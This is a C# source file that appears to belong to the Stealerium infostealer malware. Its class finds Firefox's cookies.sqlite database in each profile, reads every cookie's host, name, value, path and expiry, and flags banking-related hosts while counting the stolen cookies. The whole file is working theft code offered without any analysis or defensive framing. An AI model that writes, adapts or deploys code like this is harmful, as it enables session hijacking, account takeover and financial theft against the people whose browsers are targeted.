using System;
using System.Collections.Generic;
using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Target.Browsers.Firefox
{
    internal sealed class CCookies
    {
        // Get cookies.sqlite file location
        private static string GetCookiesDbPath(string path)
        {
            try
            {
                var dir = path + "\\Profiles";
                if (Directory.Exists(dir))
                    foreach (var sDir in Directory.GetDirectories(dir))
                        if (File.Exists(sDir + "\\cookies.sqlite"))
                            return sDir + "\\cookies.sqlite";
            }
            catch (Exception ex)
            {
                Logging.Log("Firefox >> Failed to find bookmarks\n" + ex);
            }

            return null;
        }

        // Get cookies from gecko browser
        public static List<Cookie> Get(string path)
        {
            var lcCookies = new List<Cookie>();
            try
            {
                var sCookiePath = GetCookiesDbPath(path);

                // Read data from table
                var sSqLite = SqlReader.ReadTable(sCookiePath, "moz_cookies");
                if (sSqLite == null) return lcCookies;

                for (var i = 0; i < sSqLite.GetRowCount(); i++)
                {
                    var cCookie = new Cookie
                    {
                        HostKey = sSqLite.GetValue(i, 4),
                        Name = sSqLite.GetValue(i, 2),
                        Value = sSqLite.GetValue(i, 3),
                        Path = sSqLite.GetValue(i, 5),
                        ExpiresUtc = sSqLite.GetValue(i, 6)
                    };

                    // Analyze value
                    Banking.ScanData(cCookie.HostKey);
                    Counter.Cookies++;
                    lcCookies.Add(cCookie);
                }
            }
            catch (Exception ex)
            {
                Logging.Log("Firefox >> cookies collection failed\n" + ex);
            }

            return lcCookies;
        }
    }
}